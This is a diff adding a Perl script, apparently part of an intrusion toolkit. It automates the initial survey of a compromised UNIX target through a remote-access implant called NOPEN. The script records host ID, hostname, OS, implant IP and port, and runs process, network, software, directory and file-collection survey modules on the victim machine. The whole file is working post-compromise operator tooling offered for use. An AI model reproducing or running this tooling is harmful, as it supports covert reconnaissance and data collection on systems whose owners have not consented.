@@ -1,0 +1,408 @@
+#!/usr/bin/env perl
+#
+# 20130416 - This portion of autonewdone implements the main logic of the next-gen
+# autonewdone scripts.
+#
+$VER="3.0.0.0" ;
+$ext = $$ ;			# limits likelihood of concurrent autodone's colliding
+				# BUT: still possible.
+				# not too likely to happen.
+
+$| = 1;
+
+%mons=("Jan","01","Feb","02","Mar","03","Apr","04","May","05","Jun","06","Jul","07","Aug","08","Sep","09","Oct","10","Nov","11","Dec","12");
+
+@surveytypes = ();
+%surveysalreadydone = ();
+$surveysdone = "";
+($donecount,$skipcount) = 0;
+
+myinit() ;
+
+# Set our initialized globals here.
+$statsfile = "$opdown/${targetplatform}stats.cmdout.$nopen_rhostname";
+$hostinfofile = "$opdown/hostinfo.$nopen_rhostname";
+
+# promptkill puts itself into /usr/local/bin if none or an older one is there
+# so this makes sure /usr/local/bin is current even if promptkill does not get
+# used this op
+`$opbin/promptkill -v` if (-x "$opbin/promptkill");
+
+# following is first time autonext is used without $$ extension--fewer collisions?
+# In case this is there from previous run, we save it as .NNNN
+preservefile("$opdown/hostinfo.$nopen_rhostname") unless $autonohostinfo;
+
+my @autoargv = ();
+if ((-e "$optmp/autonewdone.$nopen_rhostname" or -e "$optmp/autodont") and
+    (!$redo and !$autonohostinfo)) {
+  myalert("autonewdone has already completed on this target. Use -gs auto FORCE [SHORT] $gsoptions to re-do it.");
+} else {
+  dosurvey();
+}
+
+doit("-keepalive -v $nopenkeepalive") if ($nopenkeepalive > 0);
+
+# End with true value as we require this script elsewhere.
+1;
+
+sub dosurvey() {
+  # Set these files aside as .old if they exist
+  preservefile("$statsfile",
+               "$opdown/dmesg.$nopen_rhostname",
+               "$opdown/ipfstat.$nopen_rhostname",
+               "$opdown/iptables.$nopen_rhostname",
+               "$opdown/ls_etc-ct.$nopen_rhostname",	     
+               "$opdown/modinfo.$nopen_rhostname",
+               "$opdown/lsmod.$nopen_rhostname",
+               "$opdown/rpcinfo.$nopen_rhostname",
+               "$opdown/selinux.$nopen_rhostname",
+               "$opdown/script.ids$nopen_rhostname",
+               "$optmp/.syslog.$nopen_rhostname");
+  preservefile("$hostinfofile")
+    unless $autonohostinfo;
+
+  # Are we on a first hop?
+  ($output,$nopenlines,@firsthops) = doit("-lsh didthis | grep noclient | grepip");
+  my $firstin = 0;
+  foreach my $ip (@firsthops) {
+    $firstin++ if $ip eq $nopen_myip;
+    last if $firstin;
+  }
+  
+  chomp($partsdonesofar =
+    `cd $optmp ; ls -alrt .survey*done.$nopen_rhostname 2>/dev/null| awk '{print \$8,\$9}'`."\n");
+  $partsdonesofar =~ s/\n/\n\t/g;
+  if ($partsdonesofar) {
+    my ($ans,$longans) = mygetinput
+       ($COLOR_NOTE.
+       "Sections include: @surveytypes\n\n\t".
+       $COLOR_FAILURE.
+       $partsdonesofar.
+       $COLOR_NORMAL.
+       "\nAbove files in $optmp indicate when the autonewdone components were done\n".
+       "previously during this op, so no parts of the autonewdone survey were done.\n".
+       " You can use the -O option later to re-do all or some portions of the survey,\n".
+       "or answer \"RE-DO\" now to do so. (Default will be to <S>kip them, change\n".
+       "that to <C>ontinue for those you wish to repeat.)\n\n".
+       "Exit or RE-DO?","Exit","RE-DO"
+       );
+     
+    #dbg("in autonewdone dosurvey, ans=$ans= longans=$longans=");
+    if ($ans eq "e") {
+      return 0;
+  
+    } elsif ($ans eq "r") {
+      #dbg("in autonewdone dosurvey, deleting lock files");
+      foreach $surveytype (@surveytypes) {
+        #dbg("in autonewdone dosurvey, =.survey.${surveytype}done.$nopen_rhostname=");
+        #`rm -f $optmp/.survey.${surveytype}done.$nopen_rhostname`;
+        delete $surveysalreadydone{$surveytype};
+        #delete $surveystoskip{$surveytype};
+      }
+    }
+  }
+  myalert("NOLOGGING","BEGIN running $opetc/autonewdone on $nopen_rhostname output in $nopen_mylog (v.$VER)");
+  system("touch $optmp/autonewdone.INPROGRESS.$targetpid");
+
+  # Write out the nopen_auto.$nopen_mypid file that yells if we didn't finish a run.
+  open(YELLPROMPT, "> $optmp/.gsyell.$nopen_rhostname.$nopen_mypid") or myalert("Can't create warning text! $!");
+  print YELLPROMPT "${COLOR_FAILURE}\n".
+    "WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n".
+    "This should not happen. Please report this now\n".
+    "(yes, now...in person...go....shoo!).\n\n".
+    "You can hit return here to get your window back, though.\n\n";
+  print YELLPROMPT "${COLOR_FAILURE}\n".
+    "WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n";
+  close(YELLPROMPT);
+  
+  # Create the hostinfo file and the yell script. Yes, we want to open the hostinfo file here...
+  open(GSYELL, "> $opetc/nopen_auto.$nopen_mypid") or myalert("Can't create warning script! $!");
+  open(HOSTINFO, "> $hostinfofile") or mydie("Unable to open hostinfo file $hostinfofile! $!");
+  print GSYELL "#NOGS\n";
+  print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.out.$nopen_mypid\n";
+  print GSYELL "-lsh -nohist test -f $optmp/autonewdone.$nopen_rhostname || ".
+    "$opetc/autogetinput -O $optmp/.gsyell.out.$nopen_mypid -P $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
+  print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
+  print GSYELL "-lsh -nohist rm -f $optmp/autonewdone.INPROGRESS.$targetpid\n";
+  close(GSYELL);
+  
+  # Save the start time and current time zone of the ops station.
+  ($output) = doit("-lsh date -u");
+  chomp($output);
+  ($mon,$d,$year) =
+    $output =~ /(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d{1,2})\s+.*\s(\d{4})/i ;
+  ($h,$m,$nothing,$s) = $output =~ /\s(\d{2}):(\d{2})(:(\d{2})){0,1}\s+/ ;
+  ($tz) = $output =~ /([\D]+)\s+$year/;
+  $tz =~ s/^\s*(.*)\s*$/$1/;
+  $d += 100;
+  $d = substr($d,1);
+  print HOSTINFO "Access Start (zulu): $year-$mons{$mon}-$d $h:$m:$s\n";
+  print HOSTINFO "OP Box UTC Time Zone: $tz\n";
+  
+  # Parse the status variables and save the output.
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,
+   $localppid,$serverver,$wdir,$targetos,$targetcwd,$thispid,
+   $targetppid,$targetport,$localport,@statusoutput) = parsestatus();
+  ($remoteip,$remoteport) = ();
+  print HOSTINFO "OS: $targetos\n";
+  print HOSTINFO "OS Version: $1\n" if $targetos =~ /[^\s]+\s+([^\s]+)\s/ ;
+  print HOSTINFO "HW Architecture: $1\n" if ($targetos =~ /\s+([^\s]+)$/);
+  print HOSTINFO "RAT client ver: NOPEN $clientver\n";
+  print HOSTINFO "RAT server ver: NOPEN $serverver\n";
+  print HOSTINFO "RAT server cwd: $targetcwd\n";
+  
+  # Get the host ID and hostname as soon as possible so that the basic
+  # hostinfo file has at least one unique identifier.
+  ($output) = doitwrite("hostid");
+  chomp($output);
+  if ($output !~ /exited with status code/) {
+    print HOSTINFO "Host ID: $output\n";
+  }
+  ($output) = doitwrite("\\hostname");
+  chomp(my $hostname = $output);
+  print HOSTINFO "Hostname: $hostname\n";
+  
+  my $clientdiff = "" ;
+  my $serververshort = $serverver;
+  $serververshort =~ s/(\d+\.\d+\.\d+)\.*\d+.*/\1/;
+  my $clientvershort = $clientver;
+  $clientvershort =~ s/(\d+\.\d+\.\d+)\.*\d+/\1/;
+  if ($serverver eq $clientver) {
+    $clientdiff = "\nTool Comments: matched client/server";
+  } elsif ($serververshort eq $clientvershort) {
+    $clientdiff = "\nTool Comments: $clientver (client)".
+                  "\nTool Comments: $serverver (server) -- acceptable version mismatch";
+  } else {
+    $clientdiff = "\nTool Comments: mismatched client $clientver" ;
+  }
+  my $globaltools = "--\nTool: NOPEN V3.X\nVersion: $clientver$clientdiff\n".
+                    "Usage: EXERCISED\nUsage: ACCESSED\nTool Status: Successful\n".
+                    "Implant IP: $nopen_myip\nImplant port: $targetport\n";
+  
+  # Run the other surveys that are currently available.
+  while (1) {
+    foreach my $surveytype (@surveytypes) {
+      $surveysdone .= "\t$surveytype\n"
+        if skipordo($surveytype);
+      last if $aborting;
+    }
+    #dbg("in autonewdone dosurvey, donecount=$donecount= skipcount=$skipcount= aborting=$aborting=");
+    last if $donecount or $skipcount or $aborting;
+  }
+  
+  # Print this block of info at the bottom.
+  print HOSTINFO $globaltools;
+  
+  ($redo,$thismonth,$today,$thismonthfiles,$todayfiles) =
+    whendo("autonewdone","DONE",$thismonth,$today);
+    
+  doit("-lsh rm -f $opetc/nopen_auto.$nopen_mypid");
+  #print HOSTINFO "Surveys Completed: $surveysdone\n";
+  close(HOSTINFO);
+  myalert("NOLOGGING","DONE running $opetc/autonewdone on $nopen_rhostname");
+  
+  foreach $targetwarningfile(
+                             "$opdown/ethcheckout.txt.VMW*.$nopen_rhostname",
+                             "$opdown/ethcheckout.txt.vmw*.$nopen_rhostname",
+                             "$opdown/ethcheckout.txt.XEN*.$nopen_rhostname",
+                             "$opdown/ethcheckout.txt.xen*.$nopen_rhostname",
+                             "$opdir/latewarnings.$nopen_rhostname",
+                            ) {
+    next unless -s $targetwarningfile;
+    chomp($output = `cat $targetwarningfile 2>/dev/null`) ;
+    next unless $output;
+
+    $output .= "\n\nThere were$COLOR_FAILURE ALERTS$COLOR_NORMAL: You must examine output above before you continue.\n\n";
+    mypause("$beep\n${COLOR_FAILURE}$output");
+  }
+  unlink("$opdir/latewarnings.$nopen_rhostname");
+
+  #dbg("in autonewdone dosurvey, surveysdone=$surveysdone=");
+  $surveysdone = "\tNONE" unless $surveysdone;
+  chomp($partsdonesofar =
+    `cd $optmp ; ls -alrt .survey*done.$nopen_rhostname 2>/dev/null| awk '{print \$8,\$9}'`."\n");
+  $partsdonesofar =~ s/\n/\n\t/g;
+  #dbg("in autonewdone dosurvey, partsdonesofar=$partsdonesofar=");
+  myalert("\n\n\n${COLOR_FAILURE}AUTONEWDONE FINISHED\n\n".
+          "Completed this pass:\n$surveysdone\n\n".
+          "Completed this op:\n\t$partsdonesofar\n\n\n\n".
+          "Use \"-hostinfo\" to see the hostinfo pop-up window.")
+    unless ($surveysdone =~ /NONE/);
+
+  return 1;
+}
+
+sub skipordo {
+  local ($type) = (@_);
+  my $subtocall = "autonewdone.$type";
+  my ($dotypes,$skiptypes)= "";
+  foreach my $type (@surveytypes) {
+    $dotypes .= " $type" unless $surveystoskip{$type};
+    $skiptypes .= " $type" if $surveystoskip{$type};
+  }
+  $skiptypes = "\n(default of <S>kip for$COLOR_NOTE$skiptypes$COLOR_FAILURE)" if $skiptypes;
+  my $default = "C";
+  $default = "S" if !$doover and $surveysalreadydone{$type};
+  $default = "S" if $surveystoskip{$type};
+  my $more = $COLOR_FAILURE.
+    "Proceeding with the following autonewdone survey types$skiptypes:\n\n".
+    "    $dotypes\n\n".
+    "(To avoid these \"About to run\" prompts, use -Y option or enter \"Y\" here.)\n$COLOR_NORMAL\n"
+      unless $firsttime++;
+  my $more2 = "$COLOR_FAILURE (which has been done already)$COLOR_NORMAL"
+    if $surveystoskip{$type};
+  my ($ans,$longans) = ("S") if $surveystoskip{$type};
+  return 0 if ($nopauses and !$doover and $surveystoskip{$type});
+
+  ($ans,$longans) =
+    mygetinput
+      ("$extraoutput$COLOR_NORMAL\n\n".
+       $more.
+       "About to run gs$type() survey. You can\n".
+       "  <S>kip gs$type(),\n".
+       "  <C>ontinue or\n".
+       "  <A>bort remaining survey\n".
+       "Choose:",
+       $default,
+       "C","S","Y","A")
+        if $pauses;
+  $extraoutput = "";
+  $aborting++ if $ans eq "a";
+  $pauses-- if $ans eq "y";
+  return 0 if $aborting;
+  if ($ans eq "s") {
+    $skipcount++;
+    return 0;
+  }
+  $donecount++;
+  dbg("ans=$ans longans=$longans= before $subtocall before date");
+  mydo("$subtocall");
+  dbg("ans=$ans longans=$longans= after $subtocall before date");
+  `date > $optmp/.survey.${type}done.$nopen_rhostname`;
+  return 1;
+}
+#skipordo
+
+sub logdoit {
+    my $returnoutput = "";
+    foreach my $line (@_) {
+	my ($logoutput,$lognopenlines,@logoutput) = ();
+	if ($line =~ m,^\-,) {
+	    ($logoutput,$lognopenlines,@logoutput) = doit($line);
+	} else {
+	    ($logoutput,$lognopenlines,@logoutput) = doitwrite($line)
+              unless $builtinsonly;
+	}
+	$returnoutput .= $logoutput;
+	print CMDOUT $lognopenlines;
+	print CMDOUT $logoutput;
+    }
+    return $returnoutput;
+}
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs newdone @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs newdone";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+  
+  @surveytypes = ("proclist",
+                  "network",
+                  "osgeneral",
+                  "osspecific",
+                  "swfind",
+                  "dirlist",
+                  "fileget",
+                 );
+  %surveysalreadydone = ();
+  
+  $getoptsletters = "hvNFO";
+  $gsusagetext="
+Usage: $prog
+
+$prog performs the initial survey of a UNIX target after connecting to the
+target. This version replaced the original autonewdone script.
+ 
+Unless -O is used, $prog will not repeat sections of the survey done
+previously during this op on this host.
+
+OPTIONS
+  -h        Show this help (this is default without the -p option)
+  -v        Show version
+  -N        Show the informational pauses. By default, you will not be prompted
+            unless something urgent shows up.
+  -F        Force prompts for ALL collects (default is automatic downloads for
+            all but hardware section, i.e. /boot on Linux)
+  -O        Repeat (do Over) the sections previously completed\n";
+
+  mydie("bad option(s)") if (! Getopts( $getoptsletters ) ) ;
+  $pauses = $opt_N;
+  $forcepull =  $opt_F ? "" : "Y";
+  $forcepull2 = ($forcepull and $opt_f) ? "Y" : "";
+  $doover = $opt_O;
+  
+  # Check and see which parts of the survey we were asked to skip.
+  unless ($doover) {
+    foreach my $type (@surveytypes) {
+      $surveystoskip{$type}++ if -s "$optmp/.survey.${type}done.$nopen_rhostname";
+    }
+  }
+  
+  # Check and see which parts of the survey have already been done.
+  foreach my $type (@surveytypes) {
+    $surveysalreadydone{$type}++ if -s "$optmp/.survey.${type}done.$nopen_rhostname";
+  }
+
+  # Setting $autodone allows any mydo() called functions to know
+  # we are in this mode to populate $opdir/latewarnings*
+  $autodone=1;
+
+  # This is a fresh instance; previous failed newdones may have
+  # issued warnings we are about to repeat, so just dump them.
+  unlink("$opdir/latewarnings.$nopen_rhostname");
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+  ($redo,$thismonth,$today,$thismonthfiles,$todayfiles) =
+    whendo("autonewdone");
+dbg("BACK IN autonewdone, just called whendo:
+
+ARGS=(@ARGS)   after whendo(@_) with
+      finished=$finished=
+    yearmonstr=$yearmonstr=
+      todaystr=$todaystr=
+     autoforce=$autoforce=
+       autoyes=$autoyes=
+     autoreget=$autoreget=
+ nopenlssreget=$nopenlssreget=
+     autoshort=$autoshort=
+autonohostinfo=$autonohostinfo=
+
+RETURN:   redo=$redo,
+     thismonth=$thismonth,
+         today=$today,
+thismonthfiles=$thismonthfiles,
+    todayfiles=$todayfiles,
+
+");
+
+}#myinit
+
